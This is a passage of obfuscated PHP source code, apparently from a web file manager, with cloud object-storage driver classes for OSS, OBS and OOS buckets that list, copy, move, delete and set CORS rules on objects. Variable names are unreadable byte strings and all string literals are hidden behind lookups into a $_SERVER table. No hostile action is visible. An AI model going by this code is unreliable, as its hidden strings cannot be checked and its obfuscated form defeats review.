isset($ñ∏¯‘Æú[$Õ¿≤¶â™[245]]) ? $ñ∏¯‘Æú[$Õ¿≤¶â™[245]] : !1; } public function size($ÜÈàôÓ∫) { $ò¸õ¸Á— = $this->objectMeta($ÜÈàôÓ∫); return $ò¸õ¸Á— ? $ò¸õ¸Á—[$_SERVER[ß⁄ˆÇ†Œ][79]] : 0; } public function info($≠ø√ΩâÔ) { if ($this->isFolder($≠ø√ΩâÔ)) { return $this->folderInfo($≠ø√ΩâÔ); } else { if ($this->isFile($≠ø√ΩâÔ)) { return $this->fileInfo($≠ø√ΩâÔ); } } return !1; } public function exist($ÚÄœ˚€Ô) { return $this->isFile($ÚÄœ˚€Ô) || $this->isFolder($ÚÄœ˚€Ô); } public function isFile($ΩÔ˘‘éÓ) { return !$this->isFolder($ΩÔ˘‘éÓ) && $this->objectMeta($ΩÔ˘‘éÓ); } public function isFolder($˝ŒúÜäÓ) { return $this->cacheMethod($_SERVER[ß⁄ˆÇ†Œ][179], $˝ŒúÜäÓ); } protected function objectMeta($ì˜Ãﬁ—Ù) { return $this->cacheMethod($_SERVER[ß⁄ˆÇ†Œ][181], $ì˜Ãﬁ—Ù); } protected function _objectMeta($ı“”˛á„) { $‹Î™¡‡ß =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ı“”˛á„ == $‹Î™¡‡ß[12] || $ı“”˛á„ == $‹Î™¡‡ß[8]) { return array(); } $»µ•ÉÅê = $this->ussRequest($ı“”˛á„, $‹Î™¡‡ß[1593]); if (!$»µ•ÉÅê[$‹Î™¡‡ß[1293]]) { return null; } $€∑˛Ìø± = isset($»µ•ÉÅê[$‹Î™¡‡ß[1283]]) ? $»µ•ÉÅê[$‹Î™¡‡ß[1283]] : array(); if (!isset($€∑˛Ìø±[$‹Î™¡‡ß[1594]])) { return null; } $éë„ˆ†ì = array($‹Î™¡‡ß[33] => isset($€∑˛Ìø±[$‹Î™¡‡ß[1594]]) ? $€∑˛Ìø±[$‹Î™¡‡ß[1594]] : null, $‹Î™¡‡ß[79] => isset($€∑˛Ìø±[$‹Î™¡‡ß[1595]]) ? $€∑˛Ìø±[$‹Î™¡‡ß[1595]] : null, $‹Î™¡‡ß[245] => isset($€∑˛Ìø±[$‹Î™¡‡ß[1596]]) ? $€∑˛Ìø±[$‹Î™¡‡ß[1596]] : null, $‹Î™¡‡ß[1563] => isset($€∑˛Ìø±[$‹Î™¡‡ß[1597]]) ? $€∑˛Ìø±[$‹Î™¡‡ß[1597]] : null); $éë„ˆ†ì[$‹Î™¡‡ß[1564]] = isset($€∑˛Ìø±[$‹Î™¡‡ß[1598]]) ? strtotime($€∑˛Ìø±[$‹Î™¡‡ß[1598]]) : $éë„ˆ†ì[$‹Î™¡‡ß[1563]]; return $éë„ˆ†ì; } protected function _isFolder($ÚûâïÉƒ) { $◊ÌÙıÄ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ÚûâïÉƒ == $◊ÌÙıÄ[12] || $ÚûâïÉƒ == $◊ÌÙıÄ[8]) { return !0; } $áûâ∂ÍÕ = $this->_objectMeta($ÚûâïÉƒ); return isset($áûâ∂ÍÕ[$◊ÌÙıÄ[33]]) && $áûâ∂ÍÕ[$◊ÌÙıÄ[33]] == $◊ÌÙıÄ[78] ? !0 : !1; } } goto eÜ¥∆®Ç«÷; E• ç„é†: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($Ï”ΩÇ˙ƒ) { parent::__construct($Ï”ΩÇ˙ƒ); $this->setSignVersion($_SERVER[ß⁄ˆÇ†Œ][247]); } public function fileOutImage($ëÌ“Á§∑, $êç±ßˆÙ = 250) { $—©¢∑Ê≤ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->size($ëÌ“Á§∑) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ëÌ“Á§∑, $êç±ßˆÙ); } $ó∆úõü¥ = array($—©¢∑Ê≤[1453] => $—©¢∑Ê≤[1454] . $êç±ßˆÙ . $—©¢∑Ê≤[1455]); $˘ÊÔ∫›à = $this->link($ëÌ“Á§∑, $ó∆úõü¥); $this->fileOutLink($˘ÊÔ∫›à); } public function fileOutLink($˝â“ö´Å) { $∂£ÁàÙâ =& $_SERVER[ß⁄ˆÇ†Œ]; if (substr($˝â“ö´Å, 0, 7) == $∂£ÁàÙâ[313]) { $˝â“ö´Å = $∂£ÁàÙâ[314] . substr($˝â“ö´Å, 7); } header($∂£ÁàÙâ[175] . $˝â“ö´Å); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($’ì≠◊´) { parent::__construct($’ì≠◊´); $this->setSignVersion($_SERVER[ß⁄ˆÇ†Œ][247]); } public function fileOutLink($§ä˙™‘’) { $—∏ÙﬁüÎ =& $_SERVER[ß⁄ˆÇ†Œ]; if (substr($§ä˙™‘’, 0, 7) == $—∏ÙﬁüÎ[313]) { $§ä˙™‘’ = $—∏ÙﬁüÎ[314] . substr($§ä˙™‘’, 7); } header($—∏ÙﬁüÎ[175] . $§ä˙™‘’); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($÷ˆ¨ﬂ†æ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ß⁄ˆÇ†Œ][1456]; $this->_init($÷ˆ¨ﬂ†æ); } public function _init($Õâˆ˙¸Ò) { $ªÃ©Û¬π =& $_SERVER[ß⁄ˆÇ†Œ]; $this->config = $Õâˆ˙¸Ò; foreach ($Õâˆ˙¸Ò as $ÜΩû¯î‰ => $ÌÓèùäé) { if (isset($this->{$ÜΩû¯î‰})) { $this->{$ÜΩû¯î‰} = $ÌÓèùäé; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ªÃ©Û¬π[1457] . LNG($ªÃ©Û¬π[1458])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ìÿ˛ﬂ±Û =& $_SERVER[ß⁄ˆÇ†Œ]; $¥‚‘ƒ±À = new OSS\Model\CorsConfig(); $˙äÙœÍÁ = new OSS\Model\CorsRule(); $˙äÙœÍÁ->addAllowedOrigin($Ìÿ˛ﬂ±Û[1459]); $˙äÙœÍÁ->addAllowedMethod($Ìÿ˛ﬂ±Û[1460]); $˙äÙœÍÁ->addAllowedMethod($Ìÿ˛ﬂ±Û[1461]); $˙äÙœÍÁ->addAllowedMethod($Ìÿ˛ﬂ±Û[1462]); $˙äÙœÍÁ->addAllowedMethod($Ìÿ˛ﬂ±Û[1463]); $˙äÙœÍÁ->addAllowedMethod($Ìÿ˛ﬂ±Û[165]); $˙äÙœÍÁ->setMaxAgeSeconds(600); $˙äÙœÍÁ->addExposeHeader($Ìÿ˛ﬂ±Û[1464]); $˙äÙœÍÁ->addAllowedHeader($Ìÿ˛ﬂ±Û[1459]); $¥‚‘ƒ±À->addRule($˙äÙœÍÁ); try { $this->client->putBucketCors($this->bucket, $¥‚‘ƒ±À); } catch (OSS\Core\OssException $∑É º⁄ô) { $this->writeLog(__FUNCTION__ . $Ìÿ˛ﬂ±Û[214] . $∑É º⁄ô->getMessage()); return !1; } return !0; } public function getBucketCors() { $Ô¥˜ôºŸ =& $_SERVER[ß⁄ˆÇ†Œ]; $˚˜—Ÿê‰ = null; try { $˚˜—Ÿê‰ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÓÛŸØä›) { $this->writeLog(__FUNCTION__ . $Ô¥˜ôºŸ[214] . $ÓÛŸØä›->getMessage()); return null; } if (!$˚˜—Ÿê‰ || !($˜ÔóΩ†Ñ = $˚˜—Ÿê‰->getRules())) { return null; } $â®™¿Òç = $˜ÔóΩ†Ñ[0]->getAllowedOrigins(); $˛ô¬‰·ß = $˜ÔóΩ†Ñ[0]->getAllowedMethods(); $ÖﬂÙ≠˜” = $˜ÔóΩ†Ñ[0]->getMaxAgeSeconds(); $èÊﬂÅ©« = $˜ÔóΩ†Ñ[0]->getExposeHeaders(); $›±¨ﬂ≤ﬂ = $˜ÔóΩ†Ñ[0]->getAllowedHeaders(); return array($Ô¥˜ôºŸ[218] => isset($â®™¿Òç[0]) ? $â®™¿Òç[0] : $Ô¥˜ôºŸ[12], $Ô¥˜ôºŸ[222] => $˛ô¬‰·ß, $Ô¥˜ôºŸ[1465] => $ÖﬂÙ≠˜”, $Ô¥˜ôºŸ[1466] => isset($èÊﬂÅ©«[0]) ? $èÊﬂÅ©«[0] : $Ô¥˜ôºŸ[12], $Ô¥˜ôºŸ[219] => isset($›±¨ﬂ≤ﬂ[0]) ? $›±¨ﬂ≤ﬂ[0] : $Ô¥˜ôºŸ[12]); } public function isBucketCors() { $òÔ¡Íµë =& $_SERVER[ß⁄ˆÇ†Œ]; $»’ÑôÃß = $this->getBucketCors(); if (!$»’ÑôÃß || !is_array($»’ÑôÃß)) { return !1; } if ($»’ÑôÃß[$òÔ¡Íµë[218]] != $òÔ¡Íµë[220] || $»’ÑôÃß[$òÔ¡Íµë[219]] != $òÔ¡Íµë[220]) { return !1; } $∞Ÿûâ¸◊ = array_map($òÔ¡Íµë[221], $»’ÑôÃß[$òÔ¡Íµë[222]]); if (!is_array($∞Ÿûâ¸◊)) { $∞Ÿûâ¸◊ = array(); } $≤îè€∆Ÿ = array($òÔ¡Íµë[223], $òÔ¡Íµë[224], $òÔ¡Íµë[225], $òÔ¡Íµë[226], $òÔ¡Íµë[227]); $∫Ü±†Õπ = array_diff($≤îè€∆Ÿ, $∞Ÿûâ¸◊); return empty($∫Ü±†Õπ); } public function mkfile($óŒàπÃÓ, $Î≈®éÁÂ = '', $⁄€©Î˛  = REPEAT_RENAME) { $›í∆”Ã® = $this->setContent($óŒàπÃÓ, $Î≈®éÁÂ); if ($›í∆”Ã® !== !1) { return $this->getPathOuter($óŒàπÃÓ); } return !1; } public function mkdir($àŸ±£óÊ, $û˘‹∆Ä° = REPEAT_SKIP) { if ($û˘‹∆Ä° && $this->_isFolder($àŸ±£óÊ)) { return $this->getPathOuter($àŸ±£óÊ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($àŸ±£óÊ)); } catch (OSS\Core\OssException $ú·áÏÆ◊) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][214] . $ú·áÏÆ◊->getMessage()); return !1; } return $this->getPathOuter($àŸ±£óÊ); } private function fileList($õˆÃÔ⁄Ö, $î¬Âó€Í = '', $‹ç÷ê± = 0) { $≥€í£∂Õ =& $_SERVER[ß⁄ˆÇ†Œ]; $õˆÃÔ⁄Ö = trim($õˆÃÔ⁄Ö, $≥€í£∂Õ[8]); $ÿ“‚Ù” = empty($õˆÃÔ⁄Ö) && $õˆÃÔ⁄Ö !== $≥€í£∂Õ[228] ? $≥€í£∂Õ[12] : $õˆÃÔ⁄Ö . $≥€í£∂Õ[8]; $ïùÌ—œ¨ = $≥€í£∂Õ[12]; $ê¶˘ÿã‰ = 1000; $√∏Óèï´ = $º·Œ»¸Ü = array(); while (!0) { check_abort(); $∑äˆ‹ Œ = array($≥€í£∂Õ[1467] => $î¬Âó€Í, $≥€í£∂Õ[1468] => $ÿ“‚Ù”, $≥€í£∂Õ[1469] => $ê¶˘ÿã‰, $≥€í£∂Õ[1470] => $ïùÌ—œ¨); try { $óö€ø¯ù = $this->client->listObjects($this->bucket, $∑äˆ‹ Œ); } catch (OSS\Core\OssException $∫≠≥≈≤) { $this->writeLog(__FUNCTION__ . $≥€í£∂Õ[214] . $∫≠≥≈≤->getMessage()); break; } $ïùÌ—œ¨ = $óö€ø¯ù->getNextMarker(); $ı„‚∞∞¢ = $óö€ø¯ù->getObjectList(); $Â≤ß∏¡≤ = $óö€ø¯ù->getPrefixList(); foreach ($ı„‚∞∞¢ as $ÔÂ≠¡˘á) { if ($ÔÂ≠¡˘á->getKey() == $ÿ“‚Ù”) { continue; } $ºøÄ±Œ≠ = $ÔÂ≠¡˘á->getKey(); $Ω©ƒÛÖä = $ÔÂ≠¡˘á->getSize(); $Òõ›ƒ˚© = $ÔÂ≠¡˘á->getLastModified(); $©ûìﬂ˛Í = trim($ÔÂ≠¡˘á->getETag(), $≥€í£∂Õ[121]); $éÆ¬ùÄ± = $‹ç÷ê± ? array($≥€í£∂Õ[32] => $ºøÄ±Œ≠, $≥€í£∂Õ[79] => $Ω©ƒÛÖä, $≥€í£∂Õ[206] => strtotime($Òõ›ƒ˚©), $≥€í£∂Õ[1471] => $©ûìﬂ˛Í) : $ºøÄ±Œ≠; $´—Çœ£ÿ = $Ω©ƒÛÖä == 0 && substr($ºøÄ±Œ≠, strlen($ºøÄ±Œ≠) - 1, 1) == $≥€í£∂Õ[8] ? !0 : !1; $∂Ø ÛÍÚ = array($≥€í£∂Õ[79] => $Ω©ƒÛÖä, $≥€í£∂Õ[1472] => $Ω©ƒÛÖä, $≥€í£∂Õ[88] => strtotime($Òõ›ƒ˚©), $≥€í£∂Õ[1473] => $Òõ›ƒ˚©, $≥€í£∂Õ[1471] => $©ûìﬂ˛Í); $this->cacheMethodInfoSet($ºøÄ±Œ≠, $´—Çœ£ÿ, $∂Ø ÛÍÚ); if ($´—Çœ£ÿ) { $√∏Óèï´[] = $ºøÄ±Œ≠; continue; } $º·Œ»¸Ü[] = $éÆ¬ùÄ±; } foreach ($Â≤ß∏¡≤ as $à¶èÄÉ”) { $√∏Óèï´[] = $à¶èÄÉ”->getPrefix(); $this->cacheMethodInfoSet($à¶èÄÉ”->getPrefix(), !0); } if ($ïùÌ—œ¨ === $≥€í£∂Õ[12]) { break; } } $this->cacheMethodInfoSet($õˆÃÔ⁄Ö, !0); return array($≥€í£∂Õ[85] => $√∏Óèï´, $≥€í£∂Õ[86] => $º·Œ»¸Ü); } public function listObject($øË¡ø∆ﬂ, $œéöÖ—≥ = '') { $àÙ†≤É =& $_SERVER[ß⁄ˆÇ†Œ]; $øË¡ø∆ﬂ = trim($øË¡ø∆ﬂ, $àÙ†≤É[8]); $ìË¡√∑ = empty($øË¡ø∆ﬂ) && $øË¡ø∆ﬂ !== $àÙ†≤É[228] ? $àÙ†≤É[12] : $øË¡ø∆ﬂ . $àÙ†≤É[8]; $¯›∑Äã° = $àÙ†≤É[12]; $ä∏Û¿Àû = 1000; $‡‚ïÚÎÀ = $≈Ëâç∂¨ = array(); while (!0) { check_abort(); $Ë±åÖ´ = array($àÙ†≤É[1467] => $œéöÖ—≥, $àÙ†≤É[1468] => $ìË¡√∑, $àÙ†≤É[1469] => $ä∏Û¿Àû, $àÙ†≤É[1470] => $¯›∑Äã°); try { $ Çı–£Ú = $this->client->listObjects($this->bucket, $Ë±åÖ´); } catch (OSS\Core\OssException $ÊıÈò≠∏) { $this->writeLog(__FUNCTION__ . $àÙ†≤É[214] . $ÊıÈò≠∏->getMessage()); break; } $¯›∑Äã° = $ Çı–£Ú->getNextMarker(); $ÁàûïŸ = $ Çı–£Ú->getObjectList(); foreach ($ÁàûïŸ as $¢‚Ö≠≥£) { if ($¢‚Ö≠≥£->getKey() == $ìË¡√∑) { continue; } $ÑŒ‚üªÙ = $¢‚Ö≠≥£->getKey(); $ë–‡¨ÒÉ = $¢‚Ö≠≥£->getSize(); $Õ¢≤Ê† = $ë–‡¨ÒÉ == 0 && substr($ÑŒ‚üªÙ, strlen($ÑŒ‚üªÙ) - 1, 1) == $àÙ†≤É[8] ? !0 : !1; if ($Õ¢≤Ê†) { continue; } $≈Ëâç∂¨[] = $ë–‡¨ÒÉ . $àÙ†≤É[214] . $ÑŒ‚üªÙ; } if ($¯›∑Äã° === $àÙ†≤É[12]) { break; } } return array($àÙ†≤É[85] => $‡‚ïÚÎÀ, $àÙ†≤É[86] => $≈Ëâç∂¨); } public function copyFile($ø∑∂ÆÉ•, $Å‘ÿÂÑ’) { $´æ±«˝º = $this->size($ø∑∂ÆÉ•); if ($´æ±«˝º < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ø∑∂ÆÉ•, $this->bucket, $this->pathEncode($Å‘ÿÂÑ’)); } catch (OSS\Core\OssException $‘æ›êÃê) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][214] . $‘æ›êÃê->getMessage()); return !1; } return $this->getPathOuter($Å‘ÿÂÑ’); } $≠ΩÛ–î¬ = $this->multiCopyObject($ø∑∂ÆÉ•, $Å‘ÿÂÑ’, $´æ±«˝º); return $≠ΩÛ–î¬ ? $this->getPathOuter($Å‘ÿÂÑ’) : !1; } private function multiCopyObject($’Ë‚á»¨, $⁄«á©Èê, $ûµâ¥èÑ) { $¸ïÅÒ˙ü =& $_SERVER[ß⁄ˆÇ†Œ]; try { $ù⁄¯√ÕÂ = array(); if ($Ä¢€£ﬂü = $this->hashMd5($’Ë‚á»¨)) { $ù⁄¯√ÕÂ = array(OSS\OssClient::OSS_HEADERS => array($¸ïÅÒ˙ü[1474] => $Ä¢€£ﬂü)); } $ù∂ü–∑∑ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($⁄«á©Èê), $ù⁄¯√ÕÂ); $äÕ¶Ÿ√Ö = 1; $æÓçÊù∏ = 0; $ˆ‚ÆÑ‰’ = array(); $êß‚≈Ÿè = 1024 * 1024 * 10; $û—Ì›ÁÁ = $this->client->generateMultiuploadParts($ûµâ¥èÑ, $êß‚≈Ÿè); foreach ($û—Ì›ÁÁ as $ËÒÙ∆›ü => $´æ„¬Ò) { $Å∂˛±à¿ = $æÓçÊù∏ + (int) $´æ„¬Ò[$¸ïÅÒ˙ü[1475]]; $Éª™ê˘‰ = (int) $´æ„¬Ò[$¸ïÅÒ˙ü[422]] + $Å∂˛±à¿ - 1; $πÉÔÊ≈” = array($¸ïÅÒ˙ü[167] => $Å∂˛±à¿, $¸ïÅÒ˙ü[168] => $Éª™ê˘‰); $ˆ‚ÆÑ‰’[] = $this->client->uploadPartCopy($this->bucket, $’Ë‚á»¨, $this->bucket, $this->pathEncode($⁄«á©Èê), $äÕ¶Ÿ√Ö, $ù∂ü–∑∑, $πÉÔÊ≈”); $äÕ¶Ÿ√Ö = $äÕ¶Ÿ√Ö + 1; } $Ÿ∞º∑¶ñ = array(); foreach ($ˆ‚ÆÑ‰’ as $ËÒÙ∆›ü => $Å˝Õ∂Êõ) { $Ÿ∞º∑¶ñ[] = array($¸ïÅÒ˙ü[308] => $ËÒÙ∆›ü + 1, $¸ïÅÒ˙ü[309] => $Å˝Õ∂Êõ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($⁄«á©Èê), $ù∂ü–∑∑, $Ÿ∞º∑¶ñ); } catch (OSS\Core\OssException $†Ã…éÅî) { $this->writeLog(__FUNCTION__ . $¸ïÅÒ˙ü[214] . $†Ã…éÅî->getMessage()); return !1; } return !0; } public function moveFile($”Ω¨ûπî, $ƒ‹ıΩﬂ¸) { if ($this->copyFile($”Ω¨ûπî, $ƒ‹ıΩﬂ¸)) { $this->remove($”Ω¨ûπî); return $this->getPathOuter($ƒ‹ıΩﬂ¸); } return !1; } public function delFile($ØÆéÔ˘˝) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ØÆéÔ˘˝)); } catch (OSS\Core\OssException $›ÖΩõíÃ) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][214] . $›ÖΩõíÃ->getMessage()); return !1; } return !0; } public function delFolder($ëÇçí√€) { $ú‰´ùÆÎ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->exist($ëÇçí√€)) { return !0; } $this->listItemCache = !1; $úÒ‚—®˛ = $this->fileList($ëÇçí√€); $this->listItemCache = !0; $°÷§ÿüµ = trim($ëÇçí√€, $ú‰´ùÆÎ[8]) . $ú‰´ùÆÎ[8]; if (!empty($ëÇçí√€) && $ëÇçí√€ !== $ú‰´ùÆÎ[228] && !in_array($°÷§ÿüµ, $úÒ‚—®˛[$ú‰´ùÆÎ[85]])) { $úÒ‚—®˛[$ú‰´ùÆÎ[85]][] = $°÷§ÿüµ; } $©ùêﬁªõ = $this->delByBatch($úÒ‚—®˛[$ú‰´ùÆÎ[86]]); if (!$©ùêﬁªõ) { return !1; } $©ùêﬁªõ = $this->delByBatch($úÒ‚—®˛[$ú‰´ùÆÎ[85]]); if (!$©ùêﬁªõ) { return !1; } return $this->delFile($°÷§ÿüµ); } private function delByBatch($—‰íöŒÎ) { foreach (array_chunk($—‰íöŒÎ, 1000) as $åˆùÙÕ£) { try { $this->client->deleteObjects($this->bucket, $åˆùÙÕ£); } catch (OSS\Core\OssException $Ä®À≈–§) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][214] . $Ä®À≈–§->getMessage()); return !1; } } return !0; } public function rename($⁄á∑Àõê, $€´◊êÅ™) { return $this->renameObject($⁄á∑Àõê, $€´◊êÅ™); } private function fileInfo($êí›ï», $‹Ëﬁ “‡ = false, $∂©¢ÀÆ∆ = array()) { $⁄…›∏“¥ =& $_SERVER[ß⁄ˆÇ†Œ]; $”òôïòÕ = array($⁄…›∏“¥[32] => $this->pathThis($êí›ï»), $⁄…›∏“¥[87] => $this->getPathOuter($êí›ï»), $⁄…›∏“¥[33] => $⁄…›∏“¥[230], $⁄…›∏“¥[79] => isset($∂©¢ÀÆ∆[$⁄…›∏“¥[79]]) ? $∂©¢ÀÆ∆[$⁄…›∏“¥[79]] : 0, $⁄…›∏“¥[169] => $this->ext($êí›ï»)); if ($‹Ëﬁ “‡) { return $”òôïòÕ; } $”òôïòÕ[$⁄…›∏“¥[231]] = $”òôïòÕ[$⁄…›∏“¥[88]] = 0; $”òôïòÕ[$⁄…›∏“¥[232]] = $”òôïòÕ[$⁄…›∏“¥[233]] = !0; if (empty($∂©¢ÀÆ∆)) { $≥‡ÜØèä = $this->objectMeta($êí›ï»); if (!$≥‡ÜØèä) { return $”òôïòÕ; } $∂©¢ÀÆ∆ = array($⁄…›∏“¥[88] => strtotime($≥‡ÜØèä[$⁄…›∏“¥[1473]]), $⁄…›∏“¥[79] => $≥‡ÜØèä[$⁄…›∏“¥[1472]] + 0, $⁄…›∏“¥[1471] => $≥‡ÜØèä[$⁄…›∏“¥[1471]]); } if (isset($∂©¢ÀÆ∆[$⁄…›∏“¥[1471]]) && $∂©¢ÀÆ∆[$⁄…›∏“¥[1471]]) { $”òôïòÕ[$⁄…›∏“¥[235]] = trim($∂©¢ÀÆ∆[$⁄…›∏“¥[1471]], $⁄…›∏“¥[121]); } if (isset($∂©¢ÀÆ∆[$⁄…›∏“¥[79]])) { $”òôïòÕ[$⁄…›∏“¥[79]] = $∂©¢ÀÆ∆[$⁄…›∏“¥[79]]; } if (isset($∂©¢ÀÆ∆[$⁄…›∏“¥[88]])) { $”òôïòÕ[$⁄…›∏“¥[88]] = $∂©¢ÀÆ∆[$⁄…›∏“¥[88]]; } if (isset($∂©¢ÀÆ∆[$⁄…›∏“¥[206]]) && !trim($”òôïòÕ[$⁄…›∏“¥[88]])) { $”òôïòÕ[$⁄…›∏“¥[88]] = $∂©¢ÀÆ∆[$⁄…›∏“¥[206]]; } return $”òôïòÕ; } private function folderInfo($ÅÈ®ëÜÌ, $†ñŸ©äÀ = false, $“ä†⁄î = array()) { $¯Ñ¯äªÀ =& $_SERVER[ß⁄ˆÇ†Œ]; $Êóêﬁ˛¢ = array($¯Ñ¯äªÀ[32] => $this->pathThis($ÅÈ®ëÜÌ), $¯Ñ¯äªÀ[87] => $this->getPathOuter($¯Ñ¯äªÀ[8] . $ÅÈ®ëÜÌ), $¯Ñ¯äªÀ[33] => $¯Ñ¯äªÀ[78]); if ($†ñŸ©äÀ) { return $Êóêﬁ˛¢; } $Êóêﬁ˛¢[$¯Ñ¯äªÀ[231]] = $Êóêﬁ˛¢[$¯Ñ¯äªÀ[88]] = 0; $Êóêﬁ˛¢[$¯Ñ¯äªÀ[232]] = $Êóêﬁ˛¢[$¯Ñ¯äªÀ[233]] = !0; if (empty($“ä†⁄î)) { $ÅÈ®ëÜÌ = rtrim($ÅÈ®ëÜÌ, $¯Ñ¯äªÀ[8]) . $¯Ñ¯äªÀ[8]; $í≠òü˝¥ = $this->objectMeta($ÅÈ®ëÜÌ); if (!$í≠òü˝¥) { return $Êóêﬁ˛¢; } $“ä†⁄î = array($¯Ñ¯äªÀ[231] => $í≠òü˝¥[$¯Ñ¯äªÀ[583]][$¯Ñ¯äªÀ[1476]], $¯Ñ¯äªÀ[88] => strtotime($í≠òü˝¥[$¯Ñ¯äªÀ[1473]])); } if (isset($“ä†⁄î[$¯Ñ¯äªÀ[88]])) { $Êóêﬁ˛¢[$¯Ñ¯äªÀ[88]] = $“ä†⁄î[$¯Ñ¯äªÀ[88]]; } if (isset($“ä†⁄î[$¯Ñ¯äªÀ[231]])) { $Êóêﬁ˛¢[$¯Ñ¯äªÀ[231]] = $“ä†⁄î[$¯Ñ¯äªÀ[231]]; } return $Êóêﬁ˛¢; } public function listPath($˜÷Û„®é, $ıÊË √Ú = false) { $´‚èçÑó =& $_SERVER[ß⁄ˆÇ†Œ]; $¥◊µá€„ = $this->fileList($˜÷Û„®é, $´‚èçÑó[8], !0); foreach ($¥◊µá€„[$´‚èçÑó[85]] as $–⁄≠úÒ => $ΩÏÊãÜ„) { $¥◊µá€„[$´‚èçÑó[85]][$–⁄≠úÒ] = $this->folderInfo($ΩÏÊãÜ„, $ıÊË √Ú, $ΩÏÊãÜ„); } foreach ($¥◊µá€„[$´‚èçÑó[86]] as $–⁄≠úÒ => $ΩÏÊãÜ„) { $¥◊µá€„[$´‚èçÑó[86]][$–⁄≠úÒ] = $this->fileInfo($ΩÏÊãÜ„[$´‚èçÑó[32]], $ıÊË √Ú, $ΩÏÊãÜ„); } return $¥◊µá€„; } protected function infoChildren($©≈îû¿±, &$‹’≈å®‹) { $≤¬õõçû =& $_SERVER[ß⁄ˆÇ†Œ]; $ƒ˝ïÔØë = $this->fileList($©≈îû¿±, $≤¬õõçû[12], !0); $‹’≈å®‹[$≤¬õõçû[81]] += count($ƒ˝ïÔØë[$≤¬õõçû[85]]); $‹’≈å®‹[$≤¬õõçû[80]] += count($ƒ˝ïÔØë[$≤¬õõçû[86]]); foreach ($ƒ˝ïÔØë[$≤¬õõçû[86]] as $óÀä∂°¥) { if (!$óÀä∂°¥ || !$óÀä∂°¥[$≤¬õõçû[79]]) { continue; } $‹’≈å®‹[$≤¬õõçû[79]] += $óÀä∂°¥[$≤¬õõçû[79]]; } } public function has($òÜÚôÄÿ, $¡€Ë∏˘⁄ = false, $Ú¢≤Û»’ = true) { $∆¢ö∂ªÁ =& $_SERVER[ß⁄ˆÇ†Œ]; $òÜÚôÄÿ = trim($òÜÚôÄÿ, $∆¢ö∂ªÁ[8]); $î£•éÒ = empty($òÜÚôÄÿ) && $òÜÚôÄÿ !== $∆¢ö∂ªÁ[228] ? $∆¢ö∂ªÁ[12] : $òÜÚôÄÿ . $∆¢ö∂ªÁ[8]; $†ÜíùÍ¢ = $∆¢ö∂ªÁ[12]; $ï§Á√°¿ = 500; $∏¡§˙Å‡ = $Èö∏ÜóÀ = 0; while (!0) { check_abort(); $äïùÎ≤≥ = array($∆¢ö∂ªÁ[1467] => $∆¢ö∂ªÁ[8], $∆¢ö∂ªÁ[1468] => $î£•éÒ, $∆¢ö∂ªÁ[1469] => $ï§Á√°¿, $∆¢ö∂ªÁ[1470] => $†ÜíùÍ¢); try { $“éËÜﬁ÷ = $this->client->listObjects($this->bucket, $äïùÎ≤≥); } catch (OSS\Core\OssException $µèâû¬Ê) { $this->writeLog(__FUNCTION__ . $∆¢ö∂ªÁ[214] . $µèâû¬Ê->getMessage()); break; } $†ÜíùÍ¢ = $“éËÜﬁ÷->getNextMarker(); $‰Üö◊˙Ç = $“éËÜﬁ÷->getObjectList(); $ñ‚∞Ì⁄˛ = $“éËÜﬁ÷->getPrefixList(); if ($¡€Ë∏˘⁄) { if (count($‰Üö◊˙Ç) > 1 || count($‰Üö◊˙Ç) == 1 && $‰Üö◊˙Ç[0]->getKey() != $î£•éÒ) { $∏¡§˙Å‡ += count($‰Üö◊˙Ç) - 1; } if (!empty($ñ‚∞Ì⁄˛)) { $Èö∏ÜóÀ += count($ñ‚∞Ì⁄˛); } if ($†ÜíùÍ¢ === $∆¢ö∂ªÁ[12]) { break; } continue; } if ($Ú¢≤Û»’) { if (!empty($‰Üö◊˙Ç)) { if (count($‰Üö◊˙Ç) > 1 || $‰Üö◊˙Ç[0]->getKey() != $î£•éÒ) { return !0; } } } else { if (!empty($ñ‚∞Ì⁄˛)) { return !0; } } if ($†ÜíùÍ¢ === $∆¢ö∂ªÁ[12]) { break; } } if ($¡€Ë∏˘⁄) { return array($∆¢ö∂ªÁ[239] => $∏¡§˙Å‡, $∆¢ö∂ªÁ[240] => $Èö∏ÜóÀ); } return !1; } public function listAll($Ã∏Ω‘…Ú) { $—≈Íë∞ë =& $_SERVER[ß⁄ˆÇ†Œ]; $Øàá±ŒÏ = $this->fileList($Ã∏Ω‘…Ú, $—≈Íë∞ë[12], !0); $∫”≤”Œè = array_to_keyvalue($Øàá±ŒÏ[$—≈Íë∞ë[86]], $—≈Íë∞ë[32]); foreach ($Øàá±ŒÏ[$—≈Íë∞ë[85]] as $¸–Ê™™È) { if (is_string($¸–Ê™™È)) { $∫”≤”Œè[$¸–Ê™™È] = array($—≈Íë∞ë[79] => 0); } } return $this->listAllFiles($Ã∏Ω‘…Ú, $∫”≤”Œè); } public function canRead($©±ÏËÙ’) { $¢â‚‡∞´ =& $_SERVER[ß⁄ˆÇ†Œ]; $¿—≈Ã∏Õ = $this->pathAcl($©±ÏËÙ’); return 